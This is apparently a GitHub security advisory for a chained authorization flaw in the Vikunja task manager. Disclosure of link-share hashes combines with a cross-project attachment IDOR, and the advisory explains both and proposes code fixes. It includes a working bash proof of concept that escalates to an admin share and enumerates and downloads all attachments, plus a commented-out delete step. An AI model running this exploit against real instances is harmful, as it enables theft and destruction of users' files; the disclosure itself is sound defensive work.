# [C] Vikunja: Unauthenticated Instance-Wide Data Breach via Link Share Hash Disclosure Chained with Cross-Project Attachment IDOR

## Summary
Severity: Critical
Advisory: GHSA-2pv8-4c52-mf8j
CWE: CWE-639
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-26
Source: https://github.com/advisories/GHSA-2pv8-4c52-mf8j
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.2.1

## Details
## Summary

Two independently-exploitable authorization flaws in Vikunja can be chained to allow an unauthenticated attacker to download and delete every file attachment across all projects in a Vikunja instance. The `ReadAll` endpoint for link shares exposes share hashes (including admin-level shares) to any user with read access, enabling permission escalation. The task attachment `ReadOne`/`GetTaskAttachment` endpoint performs permission checks against a user-supplied task ID but fetches the attachment by its own sequential ID without verifying the attachment belongs to that task, enabling cross-project file access.

## Details

### Vulnerability 1: Link Share Hash Disclosure (Permission Escalation Entry Point)

Tracked in https://github.com/go-vikunja/vikunja/security/advisories/GHSA-8hp8-9fhr-pfm9

The `LinkSharing.ReadAll()` method in `pkg/models/link_sharing.go:228-287` returns all link shares for a project, including the `Hash` field:

```go
// pkg/models/link_sharing.go:46-50
type LinkSharing struct {
    ID   int64  `xorm:"bigint autoincr not null unique pk" json:"id" param:"share"`
    Hash string `xorm:"varchar(40) not null unique" json:"hash" param:"hash"`  // ← exposed in JSON
    // ...
}
```

The ReadAll clears passwords but not hashes:
```go
// pkg/models/link_sharing.go:272-277
for _, s := range shares {
    if sharedBy, has := users[s.SharedByID]; has {
        s.SharedBy = sharedBy
    }
    s.Password = ""  // ← password cleared, but hash remains
}
```

A link share user with read-only access can call `GET /api/v1/projects/:project/shares` (routed at `pkg/routes/routes.go:483`) to discover all shares, then authenticate with an admin-level share hash.

### Vulnerability 2: Cross-Project Attachment IDOR (Data Exfiltration)

Tracked in https://github.com/go-vikunja/vikunja/security/advisories/GHSA-jfmm-mjcp-8wq2

The `GetTaskAttachment` handler in `pkg/routes/api/v1/task_attachment.go:156-186` performs the permission check against the task ID supplied in the URL:

```go
// pkg/models/task_attachment_permissions.go:25-28
func (ta *TaskAttachment) CanRead(s *xorm.Session, a web.Auth) (bool, int, error) {
    t := &Task{ID: ta.TaskID}  // ← ta.TaskID from URL parameter
    return t.CanRead(s, a)     // ← checks if user can read THIS task
}
```

But `ReadOne` fetches the attachment by its own ID, ignoring the task:

```go
// pkg/models/task_attachment.go:110-111
func (ta *TaskAttachment) ReadOne(s *xorm.Session, _ web.Auth) (err error) {
    exists, err := s.Where("id = ?", ta.ID).Get(ta)  // ← fetches by attachment ID only
    // ta.TaskID is now overwritten with the ACTUAL task ID from the database
    // But the permission check already passed using the attacker-controlled task ID
```

This means: specify a task you CAN access, but an attachment ID from a different project → permission check passes, wrong attachment is returned.

### The Chain

```
Link share URL (public)
    → POST /shares/{hash}/auth (get JWT)
    → GET /projects/{id}/shares (discover admin share hash)
    → POST /shares/{admin_hash}/auth (escalate to admin)
    → GET /projects/{id}/tasks (find any accessible task ID)
    → GET /tasks/{accessible_task}/attachments/{1..N} (enumerate ALL attachments)
    → DELETE /tasks/{accessible_task}/attachments/{1..N} (destroy ALL attachments)
```

## PoC

**Prerequisites:** A Vikunja instance with at least one link share (any permission level). The attacker only needs the link share URL.

```bash
VIKUNJA="http://localhost:3456/api/v1"

# Step 1: Authenticate with a known read-only link share hash
# (Link share URLs look like: https://instance/share/HASH_HERE)
SHARE_HASH="read-only-share-hash"

TOKEN=$(curl -s -X POST "$VIKUNJA/shares/$SHARE_HASH/auth" \
  -H "Content-Type: application/json" \
  -d '{}' | jq -r '.token')

echo "Got JWT: $TOKEN"

# Step 2: Discover all link shares for the project (including admin shares)
PROJECT_ID=1  # from the link share JWT claims

SHARES=$(curl -s "$VIKUNJA/projects/$PROJECT_ID/shares" \
  -H "Authorization: Bearer $TOKEN")

echo "All shares exposed:"
echo "$SHARES" | jq '.[].hash'  # All hashes visible, including admin shares

# Step 3: Escalate to admin if available
ADMIN_HASH=$(echo "$SHARES" | jq -r '.[] | select(.permission == 2) | .hash' | head -1)

if [ -n "$ADMIN_HASH" ]; then
  TOKEN=$(curl -s -X POST "$VIKUNJA/shares/$ADMIN_HASH/auth" \
    -H "Content-Type: application/json" \
    -d '{}' | jq -r '.token')
  echo "Escalated to admin share: $ADMIN_HASH"
fi

# Step 4: Get a task ID we can legitimately access
TASK_ID=$(curl -s "$VIKUNJA/projects/$PROJECT_ID/tasks" \
  -H "Authorization: Bearer $TOKEN" | jq '.[0].id')

echo "Using accessible task: $TASK_ID"

# Step 5: Exploit attachment IDOR - enumerate ALL attachments across ALL projects
for ATTACHMENT_ID in $(seq 1 100); do
  RESP=$(curl -s -o /tmp/attachment_$ATTACHMENT_ID -w "%{http_code}" \
    "$VIKUNJA/tasks/$TASK_ID/attachments/$ATTACHMENT_ID" \
    -H "Authorization: Bearer $TOKEN")

  if [ "$RESP" = "200" ]; then
    echo "Downloaded attachment $ATTACHMENT_ID (from ANY project): /tmp/attachment_$ATTACHMENT_ID"
  fi
done

# Step 6 (destructive, with admin share): Delete attachments from other projects
# curl -s -X DELETE "$VIKUNJA/tasks/$TASK_ID/attachments/$TARGET_ATTACHMENT_ID" \
#   -H "Authorization: Bearer $TOKEN"
```

## Impact

**Confidentiality (HIGH):** An attacker with a single publicly-shared link share URL can download every file attachment across all projects in the Vikunja instance. Attachment IDs are sequential integers, making enumeration trivial. This includes confidential documents, images, and any files uploaded by any user in any project.

**Integrity (HIGH):** With the permission escalation from read-only to admin (via hash disclosure), the attacker can delete attachments from any project, causing data loss across the entire instance.

**Attack prerequisites are minimal:** Link shares are designed to be publicly shared — they're the mechanism for sharing projects with external collaborators. A single leaked or intentionally-shared link share URL (even read-only) is sufficient to compromise all file attachments instance-wide.

**Blast radius:** Every project, every task, every file attachment on the instance is exposed regardless of project membership, team boundaries, or access controls.

## Recommended Fix

**Fix 1 — Link Share Hash Disclosure:** Clear the hash field in ReadAll responses:

```go
// pkg/models/link_sharing.go — in ReadAll loop (~line 272)
for _, s := range shares {
    if sharedBy, has := users[s.SharedByID]; has {
        s.SharedBy = sharedBy
    }
    s.Password = ""
    s.Hash = ""  // ← ADD THIS: never expose hashes to other share holders
}
```

**Fix 2 — Attachment IDOR:** Verify the attachment belongs to the specified task in both ReadOne and the download handler:

```go
// pkg/models/task_attachment.go — ReadOne
func (ta *TaskAttachment) ReadOne(s *xorm.Session, _ web.Auth) (err error) {
    exists, err := s.Where("id = ? AND task_id = ?", ta.ID, ta.TaskID).Get(ta)
    //                                ^^^^^^^^^^^^^^ ADD: verify task ownership
    if err != nil {
        return
    }
    // ...
}
```

Both fixes should be applied — the attachment IDOR is exploitable independently by any authenticated user, and the link share hash disclosure enables permission escalation even without the attachment bug.

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-2pv8-4c52-mf8j
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-8hp8-9fhr-pfm9
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-jfmm-mjcp-8wq2
- https://github.com/go-vikunja/vikunja
- https://vikunja.io/changelog/vikunja-v2.2.2-was-released
